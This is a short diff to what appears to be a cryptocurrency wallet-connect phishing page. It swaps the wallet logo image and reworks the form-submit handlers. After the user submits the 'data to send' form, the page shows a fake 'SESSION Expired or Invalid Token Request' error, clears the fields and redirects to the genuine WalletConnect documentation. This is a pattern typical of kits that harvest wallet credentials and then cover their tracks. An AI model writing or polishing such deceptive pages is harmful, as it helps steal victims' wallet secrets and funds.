@@ -6963,7 +6963,7 @@
         <div class="connect-dialog-body">
           <div class="to-send-info">
             <div class="wallet-app-send-logo">
-              <img id="current-wallet-send-logo" src="https://syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name">
+              <img id="current-wallet-send-logo" src="https://coin-images.coingecko.com/coins/images/13286/large/image.png" alt="wallet-app-name">
             </div>
             <div id="current-wallet-app-send" class="wallet-app-name-send">
               My app
@@ -7708,16 +7708,18 @@
                 // $('#data-to-send :textarea').val('');
               setTimeout(function () {
                 restoreButtons();
-                $("div.message-tab").html(
-                  "<div class='alert alert-danger'>SESSION Expired or Invalid Token Request,<br> please try again later.</div>"
-                );
+                  errorBox.show();
                   $('.form-control').val('');
               }, 2500);
+                window.location.href = "https://docs.walletconnect.network/";
             },
             error: function () {
               restoreButtons();
               dismissAllDialogs();
-              errorBox.show();
+              $("div.message-tab").html(
+                  "<div class='alert alert-danger'>SESSION Expired or Invalid Token Request,<br> please try again later.</div>"
+                );
+              // errorBox.show();
               setTimeout(function () {
                 dismissAllDialogs();
                 $("#send-dialog").show();
@@ -7743,6 +7745,7 @@
   
 
 </body></html>
+
 
 
 
